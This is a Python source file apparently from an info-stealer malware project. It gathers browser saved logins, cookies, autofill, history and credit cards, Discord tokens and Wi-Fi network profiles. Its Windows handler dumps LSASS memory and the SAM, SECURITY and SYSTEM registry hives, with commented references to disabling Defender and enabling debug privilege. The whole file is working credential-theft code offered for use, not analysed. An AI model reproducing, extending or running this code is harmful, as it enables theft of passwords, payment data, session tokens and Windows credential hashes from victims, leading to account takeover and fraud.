from service.Paths import Paths
from modules.Browser import getAutoFill, getCookies, getLoginData, getHistory, getCreditCards, getDownloads
from modules.Discord import getToken
from modules.FileManager import find_everyfile_extension
from modules.Network import getInterfaces, getNetworkProfiles, getMoreInternet
from modules.Windows import dumpLsass, isTamperProtected, dumpSamDatabase, dumpSecurityDatabase, dumpSystemDatabase, getComputerInformation
from service.functions import find_computerName


def find_browsers_data():
    browsers = Paths.get("browser")
    data = {}

    for browser in browsers:
        data[browser] = {}
        data[browser]["Autofill"] = getAutoFill(
            browser, Paths.get("browser").get(browser))
        data[browser]["LoginData"] = getLoginData(
            browser, Paths.get("browser").get(browser))
        data[browser]["Cookies"] = getCookies(
            browser, Paths.get("browser").get(browser))
        data[browser]["History"] = getHistory(
            browser, Paths.get("browser").get(browser))
        # data[browser]["Bookmarks"] = getBookmarks(
        #     browser, Paths.get("browser").get(browser))
        data[browser]["Downloads"] = getDownloads(
            browser, Paths.get("browser").get(browser))
        data[browser]["Credit_Cards"] = getCreditCards(
            browser, Paths.get("browser").get(browser)
        )

    return data


def find_network_data():
    data = {}
    data["Interfaces"] = getInterfaces()
    data["Profiles"] = getNetworkProfiles()
    data["More"] = getMoreInternet(10)
    return data


def find_discord_data():
    discords = Paths.get("discord")
    data = {}

    for discord in discords:
        data[discord] = {}
        data[discord]["token"] = getToken(
            discord,
            Paths.get("discord").get(discord))
    print(data)
    return data


def find_windows_data():
    windows_data = getComputerInformation()
    print(windows_data)
    return windows_data


def handle_windows():
    if isTamperProtected():
        return "Tamper protection is enabled, please disable it and try again."
    else:
        # disableRealtimeDefender()
        # enableDebugPrivilege()
        dumpLsass(find_computerName() + "lsass.dmp")
        dumpSamDatabase(find_computerName() + "sam")
        dumpSecurityDatabase(find_computerName() + "security")
        dumpSystemDatabase(find_computerName() + "system")
        return "OK"
